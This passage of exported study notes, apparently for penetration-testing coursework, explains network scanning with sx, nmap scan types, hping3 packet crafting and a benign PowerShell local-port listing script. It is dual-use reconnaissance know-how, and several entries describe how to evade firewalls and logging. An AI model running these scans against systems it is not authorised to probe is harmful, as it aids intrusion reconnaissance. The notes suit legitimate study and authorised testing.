id="7dbc342f-f527-4d63-88a3-8a7a030f57b2" class="bulleted-list"><li style="list-style-type:disc">application scans like SOCS5, Docker and Elasticsearch</li></ul></div></p><ul id="65b72762-43a3-409c-af70-a5d431bb6f12" class="bulleted-list"><li style="list-style-type:disc"><code>sx arp &lt;target subnet&gt;</code><ul id="403bcbdb-be7a-40e2-acd5-bf01795b40e3" class="bulleted-list"><li style="list-style-type:circle">Performs arp scan and returns ip and macs in the range</li></ul></li></ul><ul id="36828b65-54be-487d-95f9-09f9465754bd" class="bulleted-list"><li style="list-style-type:disc"><code>sx arp &lt;target&gt; --json | tee arp.cache</code><ul id="c702120a-fac8-4b28-a71a-62a6200f5794" class="bulleted-list"><li style="list-style-type:circle"><code>--json</code> returns the results in json format</li></ul><ul id="f347cedd-b494-4bb9-98c3-ec8d9ad041a3" class="bulleted-list"><li style="list-style-type:circle"><code>| tee arp.txt</code> writes the results given in stdout to arp.txt</li></ul></li></ul><ul id="31b1a3dc-f5ff-445a-92ca-39a39973c806" class="bulleted-list"><li style="list-style-type:disc"><code>cat arp.cache | sx tcp -p  1-65535 &lt;target&gt;</code><ul id="b8720fc5-4f44-4135-8b97-f7528b1c3554" class="bulleted-list"><li style="list-style-type:circle">it needs the arp cache for some reason</li></ul><ul id="14c94547-0459-4eec-8519-9abe9403b270" class="bulleted-list"><li style="list-style-type:circle">gives you open ports of target</li></ul></li></ul><ul id="2a9e1843-514e-46c3-acbe-19efd74e15dc" class="bulleted-list"><li style="list-style-type:disc">Example to find open ports<ul id="d060c085-f94f-4f99-9b64-73fd797fc0c1" class="bulleted-list"><li style="list-style-type:circle"><code>cat arp.cache | sx udp --json -p 53 &lt;target&gt;</code><ul id="5f0e347a-1731-4c23-b145-6de6acac8b44" class="bulleted-list"><li style="list-style-type:square">Returns Type:3, Code:3<ul id="640dc671-43f3-4501-8e75-e458e4084c88" class="bulleted-list"><li style="list-style-type:disc">tl;dr: port unreachable </li></ul></li></ul><ul id="67bf0229-4823-46f6-8ec3-95df4371f1da" class="toggle"><li><details open=""><summary>Explaned based on RFC1222 and RFC792</summary><ul id="9e07fa74-7bf1-43e9-92ec-629e057e161d" class="bulleted-list"><li style="list-style-type:disc"><strong>RFC1122:</strong> a host should generate Destination Unreachable messages (type 3 messages) when codes are:<ul id="837b0def-ac09-4036-a1f3-e4d357cc2be1" class="bulleted-list"><li style="list-style-type:circle"><strong>2 - Protocol Unreachable</strong><p id="17a6215a-48a9-46ad-b899-b955942edc2e" class=""> when the designated transport protocol is not supported</p></li></ul><ul id="783d557d-ec88-4b91-9082-8c9e3819ac35" class="bulleted-list"><li style="list-style-type:circle"><strong>3 - Port Unreachable </strong><p id="add0d6c6-99ab-4b3d-a851-de6396ef100b" class="">when the designated transport protocol (e.g., UDP) is unable to demultiplex the datagram but has no protocol mechanism to inform the sender.</p></li></ul></li></ul><ul id="efded806-72c7-4aef-8e11-ade5a0f8ec68" class="bulleted-list"><li style="list-style-type:disc"><strong>RFC792:</strong>  What some of the codes mean:<ul id="1ed16fac-3bb4-483e-8b08-7ec87dad2e5c" class="bulleted-list"><li style="list-style-type:circle">0 - network unreachable error </li></ul><ul id="23d94e38-14ef-459b-adf5-3b3d1b1ff680" class="bulleted-list"><li style="list-style-type:circle">1-  host unreachable error</li></ul><ul id="5f6d532a-d24b-4508-be9a-6099810e284a" class="bulleted-list"><li style="list-style-type:circle">2 - protocol unreachable error</li></ul><ul id="eda5ba8a-4476-4207-bc1c-b6a4bc0b0cc4" class="bulleted-list"><li style="list-style-type:circle">3 - Port unreachable error<br/><br/><br/></li></ul></li></ul><p id="4522fd78-3541-4316-ac45-87a08d2d7f7b" class="">
</p></details></li></ul></li></ul><ul id="90f5b82e-0cd2-4235-a129-3d72be022f96" class="bulleted-list"><li style="list-style-type:circle"><code>cat arp.cache | sx udp --json -p 500 &lt;target&gt;</code><ul id="689150c7-a713-41c2-aa29-49f81b5a2485" class="bulleted-list"><li style="list-style-type:square">returns nothing so we know we successfully pinged</li></ul><ul id="2c207472-8062-4b8b-979e-dbd51d9fe58f" class="bulleted-list"><li style="list-style-type:square">OSes are required to return something if it does not exist or its incorrect as seen from RFC standards</li></ul><p id="907de7fb-1f79-4c8f-9e4d-2f59708c386f" class="">
</p></li></ul></li></ul></details></li></ul><ul id="54bb36c2-0945-473c-9a26-91a285a87c63" class="toggle"><li><details open=""><summary>Nmap</summary><p id="8d9bf1be-6c2d-43f6-b775-4d7da091e67f" class="">Scanning ports now</p><ul id="e13f6e12-3d8c-4453-8c32-21cffcacfd85" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sT -v 10.10.1.22</code><ul id="582252df-d59f-4ac3-a393-b2171d5fe92f" class="bulleted-list"><li style="list-style-type:circle"><code>-sT</code> performs TCP scan<ul id="458fdf03-453f-4e1c-9263-ec5a515b1b3a" class="toggle"><li><details open=""><summary>TCP scan explained</summary><p id="7b097e1e-9e09-4a87-9d7e-3e8379f5f416" class="">TCP connect scan completes a three-way handshake with the target machine. In the TCP three-way handshake, the client sends a SYN packet, which the recipient acknowledges with the SYN+ACK packet. In turn, the client acknowledges the SYN+ACK packet with an ACK packet to complete the connection. Once the handshake is completed, the client sends an RST packet to end the connection.</p></details></li></ul></li></ul><ul id="b900582c-69a2-4cf0-a51d-e795abb1d41b" class="bulleted-list"><li style="list-style-type:circle"><code>-v</code> for verbosity</li></ul></li></ul><ul id="927ea6ac-879a-4202-b95b-b8fc7e8d2b64" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sS -v &lt;target&gt;</code><ul id="cd60b086-23d4-4f30-93be-ce7fb8465506" class="bulleted-list"><li style="list-style-type:circle"><code>-sS</code> performs TCP stealth half open scan<ul id="88459c72-aae4-4b55-ac8c-bbb3920de327" class="toggle"><li><details open=""><summary>TCP Stealth scan explained</summary><p id="aad9cabf-89d3-4584-aad4-2a404300b927" class="">The stealth scan involves resetting the TCP connection between the client and server abruptly before completion of three-way handshake signals, and hence leaving the connection half-open.</p></details></li></ul><ul id="3330e03c-269a-402b-bf8b-ab99e7f9b75b" class="toggle"><li><details open=""><summary>How it works</summary><ul id="c29d55c2-6027-48ad-b04c-33cf0e5cc4bb" class="bulleted-list"><li style="list-style-type:disc">Sends SYN</li></ul><ul id="fafa80bd-e1f1-4f03-8944-70e8e42eab9a" class="bulleted-list"><li style="list-style-type:disc">Receives SYN-ACK</li></ul><ul id="9daac64e-3b05-4a4d-b656-301cb353bd83" class="bulleted-list"><li style="list-style-type:disc">Sends RST</li></ul></details></li></ul></li></ul><ul id="b719a67a-c09d-4544-ba86-87770fb1aca7" class="bulleted-list"><li style="list-style-type:circle">This technique can be used to bypass firewall rules and loggers</li></ul><ul id="35313e39-7f1f-43ad-84b2-12f70d0dd798" class="bulleted-list"><li style="list-style-type:circle">This is because its not a complete TCP connection, so it might not get logged</li></ul></li></ul><ul id="5dcac638-0b1e-496f-97af-96a28d52a75c" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sX -v &lt;target&gt;</code><ul id="77472af9-08c6-4fb9-91a2-91bb009ff7b4" class="bulleted-list"><li style="list-style-type:circle"><code>-sX</code> performs XMAS scan<ul id="b4c34d51-7519-4da2-85d5-65dc20c5ae23" class="toggle"><li><details open=""><summary>Xmas Scan Explained</summary><p id="aaf36668-be76-493f-b091-ef962830e0a9" class="">Xmas scan sends a TCP frame to a target system with FIN, URG, and PUSH flags set. If the target has opened the port, then you will receive no response from the target system. If the target has closed the port, then you will receive a target system reply with an RST.</p></details></li></ul></li></ul><ul id="89be9d8a-b914-4fa9-bb56-399c8c2762eb" class="bulleted-list"><li style="list-style-type:circle">lights up flags as a christmas tree</li></ul><ul id="147e34a5-4605-4530-adb9-65dc38d20775" class="bulleted-list"><li style="list-style-type:circle">no response shows that the port is open but it might also be filtered</li></ul><ul id="89f9e86f-604b-4db6-900b-7d81802732e7" class="bulleted-list"><li style="list-style-type:circle">windows does not respond to packets with these flags</li></ul><ul id="9b808d35-3fef-45e5-bd8a-c14b755098c1" class="bulleted-list"><li style="list-style-type:circle">might evade firewalls that are not configured to unusual TCP flags</li></ul></li></ul><ul id="4eb5737c-4cc4-4da1-baa2-efa07159e4bd" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sM -v &lt;target&gt;</code><ul id="8e4dfa85-feb0-4868-ab84-6d26b515c39b" class="bulleted-list"><li style="list-style-type:circle"><code>-sM</code> performs TCP Maimon scan (named after its inventor)</li></ul><ul id="a0acea52-6df1-43e4-9324-0d880e490433" class="bulleted-list"><li style="list-style-type:circle">alternative scan method if others are ineffective, used for evasion for rules that do not expect unexpected packets</li></ul><ul id="e0d447c0-5fae-44ed-b0a4-1a271c20dbb4" class="bulleted-list"><li style="list-style-type:circle">a FIN and ACK enabled message (weird combination) is sent to the target; if there is no response, then the port is Open|Filtered, but if the RST packet is sent as a response, then the port is closed.</li></ul><ul id="8d0b31c5-9e55-4414-9ff9-198b28be9f83" class="toggle"><li><details open=""><summary>Expected Responses</summary><ul id="4619fe8d-46b8-4755-a3b6-22e602274c56" class="bulleted-list"><li style="list-style-type:disc"><strong>Open Ports</strong>: The theory based on the original RFC suggests that if a port is open, the system should ignore the packet, similar to how it would handle a lone FIN packet during a regular FIN scan. However, in practice, many systems will still send a RST in response to a Maimon scan regardless of the port state, although some may indeed ignore it.</li></ul><ul id="16182f57-d0b1-4159-81f9-cc2717cd3d33" class="bulleted-list"><li style="list-style-type:disc"><strong>Closed Ports</strong>: If a port is closed, the target is expected to respond with a RST packet, acknowledging the receipt of the FIN-ACK but indicating that the port is closed.</li></ul></details></li></ul></li></ul><ul id="4c7c77ba-41da-44d3-812e-2c6897b97876" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sA -v &lt;target&gt;</code><ul id="159c0e4b-87e7-48ee-8dc3-7f8d321e89c7" class="bulleted-list"><li style="list-style-type:circle"><code>-sA</code> performs an ACK scan<ul id="bed9d22b-6418-48f7-842e-851b00ca4045" class="toggle"><li><details open=""><summary>Explained</summary><p id="cc4d3d79-39fe-4bcf-9b8d-99e07ca8de24" class="">The ACK flag probe scan sends an ACK probe packet with a random sequence number; no response implies that the port is filtered (stateful firewall is present), and an RST response means that the port is not filtered.</p></details></li></ul></li></ul><ul id="4f492f5e-0141-4f5d-a87f-2bb3086e7c7a" class="bulleted-list"><li style="list-style-type:circle">used to understand which ports are filtered by firewall</li></ul><ul id="9f362e33-4acb-4a05-a532-baed1f71b1da" class="bulleted-list"><li style="list-style-type:circle">Remember: windows machines do not respond to these if firewall is on</li></ul></li></ul><ul id="d2469255-0832-4fd6-a724-9702229ed2ae" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sU -v &lt;target&gt;</code><ul id="043f1ba3-12e0-4cd0-88f1-c6193632328f" class="bulleted-list"><li style="list-style-type:circle"><code>-sU</code> performs UDP Scan</li></ul><ul id="9d135abd-6e5b-4f53-a004-fd09ccd3b218" class="bulleted-list"><li style="list-style-type:circle">The UDP scan uses UDP protocol, there is no three-way handshake</li></ul><ul id="d00361ea-928a-4476-9cea-7f54ce33510f" class="bulleted-list"><li style="list-style-type:circle">It sends UDP packets to the target host; no response means that the port is open. If the port is closed, an ICMP port unreachable message is received.</li></ul></li></ul><ul id="e2ae84f9-e7fd-4fd7-a341-59254761e051" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sN -v &lt;target&gt;</code><ul id="cd97300a-d80c-4c38-81c7-a6567ecacf28" class="bulleted-list"><li style="list-style-type:circle"><code>-sN</code> Null Scan</li></ul><ul id="6c10c6df-a0eb-4ce3-8c6a-55908a4795f6" class="bulleted-list"><li style="list-style-type:circle">sends TCP packets with no flags</li></ul><ul id="cf34c5d6-7bcf-4fe0-8744-e3e3f1c2b475" class="bulleted-list"><li style="list-style-type:circle">this is an invalid scenario to tcp standards</li></ul><ul id="0aa46c29-fed7-4f13-8120-13eb298c7935" class="toggle"><li><details open=""><summary>Expected Behaviour</summary><ul id="d9055e02-8030-4f43-bb9a-b7f9d62686a8" class="bulleted-list"><li style="list-style-type:disc"><strong>No Response</strong>: According to the RFC specifications for TCP, if a port is open, the host should not send any response to a packet with no flags set.</li></ul><ul id="8e775719-c5a0-4a1a-a9a2-54306e038a29" class="bulleted-list"><li style="list-style-type:disc"><strong>RST (Reset) Response</strong>: If the target responds with an RST packet, it indicates that the port is closed. The host is actively responding to the anomalous packet, acknowledging that the communication attempt is invalid.</li></ul></details></li></ul><ul id="1d53b0bb-1949-4da6-be67-6641c590ed07" class="bulleted-list"><li style="list-style-type:circle">Usage<ul id="669b3a70-cd6f-4b81-8522-ef987493a50a" class="bulleted-list"><li style="list-style-type:square">used to evade rules that monitor packets with specific flags</li></ul><ul id="d6869a88-4fc2-4ee6-b7e1-dbb6d492e107" class="bulleted-list"><li style="list-style-type:square">less likely to be logged by systems due do not having flags</li></ul></li></ul><ul id="5e6f4179-43ac-42eb-adc0-2b92b14efd44" class="bulleted-list"><li style="list-style-type:circle">Can be used to quickly find closed ports and then examine specific open ports with more targeted scans<ul id="471b2e56-4910-487b-bd04-f554ec7ce07d" class="bulleted-list"><li style="list-style-type:square">used to send a spoofed source address to a computer to discover what services are available.</li></ul></li></ul></li></ul><ul id="f614a9f6-0d9c-48e0-8ec6-1fe7f3d61dce" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sI -v &lt;target&gt;</code><ul id="4ae836f5-97ec-4985-80fd-8c40779a236f" class="bulleted-list"><li style="list-style-type:circle"><code>-sI</code> IDLE/IPID Header Scan<ul id="f7df9668-7103-46cb-9718-eaa91e0e2bdc" class="bulleted-list"><li style="list-style-type:square">uses a zombie computer to do this<ul id="47859da8-1671-4d33-b6d1-d10cd09e7ae6" class="toggle"><li><details open=""><summary>How it works</summary><ul id="d5aa6d51-ade0-407c-bf82-a415a7b20f73" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 1:</strong> The attacker first sends a probe (e.g., SYN/ACK) to the zombie to get the initial IP ID value.</li></ul><ul id="9dfaa3a8-d3ba-4781-9dc4-58c2aab35d19" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 2:</strong> The attacker then spoofs a packet from the zombie to the target. This packet is typically a SYN packet, which makes the target respond with a SYN/ACK if the port is open, or with an RST if the port is closed.</li></ul><ul id="9bbb113c-ab83-46c6-8de3-441d4814c40b" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 3:</strong> If the target sends a SYN/ACK, the zombie, believing it initiated the SYN packet, will send an RST to the target. This RST packet increments the IP ID of the zombie.</li></ul><ul id="0e38381e-4ed3-40b1-b6e9-a66f6233867e" class="bulleted-list"><li style="list-style-type:disc"><strong>Step 4:</strong> The attacker sends another probe to the zombie to get the new IP ID value.</li></ul></details></li></ul></li></ul><ul id="4611477f-419c-4d33-8406-2f13c699d4f4" class="bulleted-list"><li style="list-style-type:square">Modern operating systems use IP ID randomization to prevent this</li></ul></li></ul></li></ul><ul id="fbf3c67b-e59e-4b34-bd5a-092fec74bddd" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sY -v &lt;target&gt;</code> <ul id="ebb6a0b6-3616-4dc3-849f-8bcc5b706267" class="bulleted-list"><li style="list-style-type:circle"><code>-sY</code> SCTP INIT Scan</li></ul><ul id="96a87e6d-b697-4ff5-8530-433b4d6934b8" class="bulleted-list"><li style="list-style-type:circle">uses the SCTP protocol instead of TCP. </li></ul><ul id="baef06e6-c0be-445e-9220-d9ae61832849" class="bulleted-list"><li style="list-style-type:circle">Sends an INIT <ul id="76ab8d3c-8b95-4c3e-9143-11852da52001" class="bulleted-list"><li style="list-style-type:square">If port is open, an INIT ACK will be replied</li></ul><ul id="0cb965cc-7eb3-4ae7-86e0-7f9cf85cca27" class="bulleted-list"><li style="list-style-type:square">if port is closed, an ABORT will be replied</li></ul></li></ul><ul id="d27a4ad7-4975-438d-b1e8-bb18bcf37aea" class="bulleted-list"><li style="list-style-type:circle">Its similar to TCP SYN,</li></ul><ul id="f8c0e5d8-5d93-416f-9d67-357511a22a00" class="bulleted-list"><li style="list-style-type:circle">Is stealthy as it leaves the connection half-open</li></ul><ul id="9def728d-7232-447d-bdce-2053362845e4" class="bulleted-list"><li style="list-style-type:circle">if there is no response, then the port is indicated as a filtered port. </li></ul><ul id="01dae3fe-1155-423e-a3dd-a4cf8ad8041f" class="bulleted-list"><li style="list-style-type:circle">The port is also indicated as a filtered port if the target server responds with an ICMP unreachable exception <ul id="2df55f40-621e-49a1-a0b7-153041d85975" class="bulleted-list"><li style="list-style-type:square">type 3, code 0, 1, 2, 3, 9, 10, or 13</li></ul></li></ul></li></ul><ul id="b5b83ab7-6bec-40fa-bf57-f6e59d3a90ea" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sZ -v &lt;target&gt;</code><ul id="c4c8e546-8567-43e9-805a-c4455aa97205" class="bulleted-list"><li style="list-style-type:circle"><code>-sZ</code> SCTP Cookie Echo Scan</li></ul><ul id="2cab89aa-8933-4805-ac0d-c53f5b27adc2" class="bulleted-list"><li style="list-style-type:circle">Uses SCTP protocol just like the previous scan</li></ul><ul id="d1f85bc8-66c2-4e14-a211-cdac47511d13" class="bulleted-list"><li style="list-style-type:circle">but this stume uses a COOKIE ECHO chunk</li></ul><ul id="bd0c0646-545d-4ea8-ae76-d66ea87cef40" class="bulleted-list"><li style="list-style-type:circle">no response implies that the port is open</li></ul><ul id="62c3e558-f694-4fac-8c31-3490561f6082" class="bulleted-list"><li style="list-style-type:circle">ABORT Chunk response means that the port is closed.</li></ul></li></ul><ul id="49d805b5-51aa-4409-b1d7-e5e0d240b634" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -sV &lt;&lt;target&gt;</code><ul id="8dfd4062-8063-4bad-a0bb-c0a3e188617c" class="bulleted-list"><li style="list-style-type:circle"><code>-sV</code> performs a service scan to obtain info about running services</li></ul><ul id="44b44144-3905-46e9-b60b-675ec1c88843" class="bulleted-list"><li style="list-style-type:circle">Runs scripts on each port to identify the service name and versions</li></ul><ul id="7770e129-769f-46e7-8611-89cf3910418e" class="bulleted-list"><li style="list-style-type:circle">TEST THIS WITH WIRESHARK TO SEE HOW LOUD IT IS</li></ul></li></ul><ul id="59330852-b1fe-4aa4-8816-af1f51567810" class="bulleted-list"><li style="list-style-type:disc"><code>nmap -A 10.10.1.*</code><ul id="80e3ef09-4f95-439e-9a5d-97bcc924f198" class="bulleted-list"><li style="list-style-type:circle"><code>*</code> scans all target in range</li></ul><ul id="8595eee5-cf76-444b-95e7-da2c2f0fffa2" class="bulleted-list"><li style="list-style-type:circle"><code>-A</code> aggressive scan option </li></ul><ul id="9f2aad6c-c0e0-42a8-9781-1782a56d03db" class="bulleted-list"><li style="list-style-type:circle">supports <ul id="a6f9b21f-cc18-463d-a823-759d2f019efc" class="bulleted-list"><li style="list-style-type:square">OS detection (-O), </li></ul><ul id="68211442-4956-4e9a-8dc2-d8b8d3bbf279" class="bulleted-list"><li style="list-style-type:square">version scanning (-sV), </li></ul><ul id="9bb9685f-6e5f-4214-82c2-b2aa46596710" class="bulleted-list"><li style="list-style-type:square">script scanning (-sC), an</li></ul><ul id="2f41530a-b879-46ff-b1c7-6425d320750c" class="bulleted-list"><li style="list-style-type:square">raceroute (--traceroute). </li></ul></li></ul><ul id="3c4a2cf2-ebd5-42b4-98d8-5dbe7b013ea9" class="bulleted-list"><li style="list-style-type:circle">Very loud, dont use it against target networks without permission.</li></ul></li></ul><ul id="7e3eb214-12ae-44c3-bef9-7ae8f68ea8de" class="bulleted-list"><li style="list-style-type:disc"><code>Zenmap</code><ul id="cb9df1e4-a3ff-4433-9102-cd8d37968c54" class="bulleted-list"><li style="list-style-type:circle">You can create your own profile and name it to use it on demand<ul id="03ec8030-9da0-4975-aa46-bcf967393f2a" class="bulleted-list"><li style="list-style-type:square">Profile → New profile or command</li></ul><ul id="4d866158-557f-41bb-8b63-ac56893a7c09" class="bulleted-list"><li style="list-style-type:square"><strong>Useful:</strong> Has all the options in the Scan tab, even explains them and shows how you can combine them</li></ul></li></ul><ul id="bb734fc9-37a2-44b7-abbd-d89537790931" class="bulleted-list"><li style="list-style-type:circle">You can have structured info for each host <ul id="08756fb9-d859-4b99-b2e6-5faf574222f8" class="bulleted-list"><li style="list-style-type:square">Click on the host on the side → Use Host Details</li></ul><ul id="f00a2be6-da1b-41f9-8f09-f47ebc312f72" class="bulleted-list"><li style="list-style-type:square"> Displays info such as Host Status, Addresses, Operating System, Ports used, OS Classes, etc. associated with the selected host.</li></ul></li></ul></li></ul></details></li></ul><ul id="16bb1a85-248a-4a69-a6bc-5ef8df802375" class="toggle"><li><details open=""><summary>Hping2/Hping3</summary><p id="0a7ad9ff-508b-4682-b19c-8bcf2bab0f30" class=""><strong>Network scanning</strong> and <strong>packet crafting tool</strong> for the TCP/IP protocol </p><p id="876e7618-f7e7-4583-bf06-692f05a480b2" class="">Sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols. </p><p id="de13eab4-189d-4f45-85fa-a855a648ea40" class="">Gain info about ports and their services, the OS of the target</p><p id="7dd4621e-d600-47a8-9d89-e76541b3678d" class="">
</p><ul id="e2f296e9-42ef-4ecd-bdcd-ca2f38941a54" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -A &lt;target&gt; -p 80 -c 5</code><ul id="6c709444-88a5-4c04-9ba5-1f836af8fd7f" class="bulleted-list"><li style="list-style-type:circle"><code>-A</code> sends ACK</li></ul><ul id="15c0bd4a-8d0f-46dd-9d22-22d0022792f0" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> define port</li></ul><ul id="40b237dd-71e1-4f84-9858-612196cd371c" class="bulleted-list"><li style="list-style-type:circle"><code>-5</code> number of packets to send</li></ul><ul id="2db73bba-6882-449c-8777-46fbc1008861" class="bulleted-list"><li style="list-style-type:circle"> Sends an ACK probe packet to the target host</li></ul><ul id="8b78694d-9fb2-426b-a37f-deaa9a1a8d08" class="bulleted-list"><li style="list-style-type:circle">no response means that the port is filtered. </li></ul><ul id="e0f13cbc-5959-4e7b-805d-3d3c2e1820de" class="bulleted-list"><li style="list-style-type:circle">If an RST response returns, this means that the port is closed.</li></ul></li></ul><ul id="5fdf6335-cae3-4c9e-af3c-818c61f6ef91" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -8 0-100 -S &lt;target&gt; -V</code><ul id="abedf58c-28f1-4749-a91b-437e9318a0cd" class="bulleted-list"><li style="list-style-type:circle"><code>-8</code> scan mode (to beautify results)</li></ul><ul id="1ffbd7ea-2b96-47a8-bda9-fcaf5c0c7a06" class="bulleted-list"><li style="list-style-type:circle"><code>0-100</code>range of ports</li></ul><ul id="f74e71e6-65ba-41ae-a7f5-620cadf5bc34" class="bulleted-list"><li style="list-style-type:circle"><code>-V</code> verbose mode</li></ul><ul id="3dfde6e6-957d-4da4-9196-664def65ff73" class="bulleted-list"><li style="list-style-type:circle">Performs SYN scan <ul id="cbf79118-c14d-4dfd-a580-19affa49ca1f" class="bulleted-list"><li style="list-style-type:square">uses SYN and obvserves ACK and RST responses to identify open and closed ports</li></ul></li></ul></li></ul><ul id="7f606a72-b449-42ef-8e79-58ff37f6045a" class="bulleted-list"><li style="list-style-type:disc"><code><strong>hping3 -F -P -U &lt;target&gt; -p 80 -c 5</strong></code><ul id="5fa8e711-ceb4-4166-8c58-73b11e28e9be" class="bulleted-list"><li style="list-style-type:circle"><code>-F</code> sets the FIN flag</li></ul><ul id="f67f6af5-abd4-41cd-ad20-f9e1d2fdc09e" class="bulleted-list"><li style="list-style-type:circle"><code>-P</code> set the PUSH flag</li></ul><ul id="a1ff8702-c859-4b1b-abb5-3daf73fec14e" class="bulleted-list"><li style="list-style-type:circle"><code>-U</code> sets the URG flag</li></ul><ul id="54593901-43b0-4bc8-924d-4c744c4102d3" class="bulleted-list"><li style="list-style-type:circle"><code>-c</code> specifies packet count</li></ul><ul id="b90da355-d0eb-40e5-adc3-1aff0bb9d897" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> port to be scanned</li></ul><ul id="f6a3d790-efc0-41d7-9b09-ddeff6ae4a92" class="bulleted-list"><li style="list-style-type:circle">if number of packets received is equal to packets sent, port is open</li></ul><ul id="bfa79a39-d938-4db8-8214-2a3ae978af3a" class="bulleted-list"><li style="list-style-type:circle">If the port is closed, Hping will return an RST response.</li></ul></li></ul><ul id="0d318893-576c-40e6-b6d6-884f96d86cd5" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 --scan 0-100 -S &lt;target&gt;</code><ul id="3b52f9b0-2f3f-48c5-a900-0195ae943ea0" class="bulleted-list"><li style="list-style-type:circle"><code>--scan</code> specifies scan mode (just like <code>-8</code>)</li></ul><ul id="865dd64f-296b-483f-bd94-4a3acf9db628" class="bulleted-list"><li style="list-style-type:circle"><code>-S</code> sets SYN Flag</li></ul><ul id="d80d4d0a-563f-41ad-a496-aeb918b6c560" class="bulleted-list"><li style="list-style-type:circle">This is a TCP stealth scan</li></ul><ul id="6b2e638f-577d-4d75-abdf-c64c6a59e4aa" class="bulleted-list"><li style="list-style-type:circle">If SYNACK responds, ports are open</li></ul></li></ul><ul id="4f0e14f3-c70c-476e-98cf-b347dcade26d" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -1 &lt;target&gt; -p 80 -c 5</code><ul id="54960c21-ea0a-4331-a78a-939689f46bf5" class="bulleted-list"><li style="list-style-type:circle"><code>-1</code> or <code>--icmp</code>icmp scan</li></ul><ul id="48f1d3a1-12f4-4c1c-b424-c709335d8d80" class="bulleted-list"><li style="list-style-type:circle"><code>-c</code> packet count</li></ul><ul id="90f2f191-a91a-495e-a808-ec9f2719c432" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> port</li></ul><ul id="4f50bedf-a4a6-4c86-8376-27acc90b8282" class="bulleted-list"><li style="list-style-type:circle">just a ping on port 80</li></ul></li></ul><ul id="895ef1df-d618-4d18-98a0-d862807f98ef" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -1 &lt;target subnet&gt; --rand-dest -I eth0</code><ul id="5eb86cc3-9125-4445-be3b-d84cea5fdb56" class="bulleted-list"><li style="list-style-type:circle"><code>--rand-dest</code> picks random destinations from subnet</li></ul><ul id="054b96ee-20dc-497e-b101-bde48ace2cda" class="bulleted-list"><li style="list-style-type:circle"><code>-1</code> icmp scan</li></ul><ul id="9abc89cf-8d91-40e8-9f04-970edef13445" class="bulleted-list"><li style="list-style-type:circle">subnet ping scan for live hosts with randomisation</li></ul></li></ul><ul id="ca1b4744-6df3-49d1-bfb0-0e12e8b6dbe0" class="bulleted-list"><li style="list-style-type:disc"><code>hping3 -2 &lt;target&gt; -p 80 -c 5</code><ul id="701e8fd2-ea0e-4aac-9c0b-b63fe1fc3c76" class="bulleted-list"><li style="list-style-type:circle"><code>-2</code> udp scan</li></ul><ul id="359b4860-aaa7-4391-bf77-dfd5bd1619e8" class="bulleted-list"><li style="list-style-type:circle"><code>-p</code> port</li></ul><ul id="54dd045d-49ae-4ed1-8b68-e9b0e4ab15dd" class="bulleted-list"><li style="list-style-type:circle"><code>-c</code> packet no</li></ul></li></ul></details></li></ul><ul id="7d5d68aa-fd57-43e5-88cd-34d1dcc24695" class="toggle"><li><details open=""><summary>Local windows port scan</summary><ul id="200729b0-85bd-47c4-a466-e876bac128ea" class="bulleted-list"><li style="list-style-type:disc"><code>netstat -an | find &quot;LISTEN&quot;</code><ul id="b8fc347f-06ba-42b6-bd53-fc049dcb63ef" class="bulleted-list"><li style="list-style-type:circle">Shows listening ports on local system</li></ul><ul id="60e1be53-3d4b-4d2e-8862-c067a15d1327" class="bulleted-list"><li style="list-style-type:circle">Those listening on 0.0.0.0, listen to all adapters, inlcuding localhost</li></ul><ul id="a908d9c0-7787-4ccd-8e55-c708208d3abc" class="bulleted-list"><li style="list-style-type:circle">Thos listening on :: listen to ipv6 ports</li></ul></li></ul><ul id="a1ef7fa3-51c3-434c-b916-c771d8200b5a" class="bulleted-list"><li style="list-style-type:disc">Powershell script that uses netstat and pid to find which ports are open by which processes<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="63ef30ac-b92a-4bca-9e5c-c3e70dbb94d6" class="code"><code class="language-PowerShell"># Run netstat to get a list of listening ports and associated PIDs
$netstatOutput = netstat -ano | Select-String &quot;LISTENING&quot;

# Create an array to store the port and process information
$portProcessList = @()

foreach ($line in $netstatOutput) {
    # Split the line into an array of words
    $columns = $line -split &quot;\s+&quot;
    
    # Extract the local address and the process ID (PID)
    $localAddress = $columns[2]
    $processId = $columns[-1]
    
    # Extract the port number from the local address
    $port = ($localAddress -split &quot;:&quot;)[-1]
    
    # Get the process name using the PID
    try {
        $process = Get-Process -Id $processId -ErrorAction Stop
        # Add the port and process information to the array
        $portProcessList += [PSCustomObject]@{
            Port    = $port
            Process = $process.Name
        }
    } catch {
        # Handle cases where the process might not be found
        Write-Warning &quot;Process with ID $processId not found.&quot;
    }
}

# Output the results in a formatted table
$portProcessList | Sort-Object Port | Format-Table -AutoSize
</code></pre></li></ul></details></li></ul><p id="29ec9721-78b6-4798-9d08-ed230c2f6db6" class="">
